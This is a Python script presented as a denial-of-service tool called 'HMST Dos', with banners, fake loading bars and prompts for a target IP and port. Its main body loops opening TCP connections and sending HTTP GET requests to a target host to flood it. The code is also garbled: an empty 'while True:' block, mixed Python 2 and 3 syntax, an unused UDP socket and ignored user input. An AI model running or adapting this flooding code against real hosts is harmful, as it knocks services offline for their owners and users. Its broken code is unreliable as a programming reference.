import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system ("clear")
os.system("figlet HMST Dos")
print
print ("Dono: Hamster")
print ("☠️")
print ("Instagram : @hamster.py")
print ("With great power comes great responsibility.")
ip = input("IP : ")
port  = input("Port IP   :")

os.system("clear")
os.system("figlet HMSTLOL")
print ("[+]--Carregando>                           [+]0% ")
time.sleep(5)
print ("[+]-- Carregando>                          [+]25% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]50% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]75% ")
print ("[+]--Carregando>                           [+]100% ")
time.sleep(5)
sent = 0
while True:
print "][ Attacking " + sys.argv[1]  + " ... ]["  
print "injecting " + sys.argv[2];  
def attack():  
    import socket, sys, os
    #pid = os.fork()  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    s.connect((sys.argv[1], 80))  
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
    s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
    s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
    s.close()  
for i in range(1, 1000):  
    attack()  
  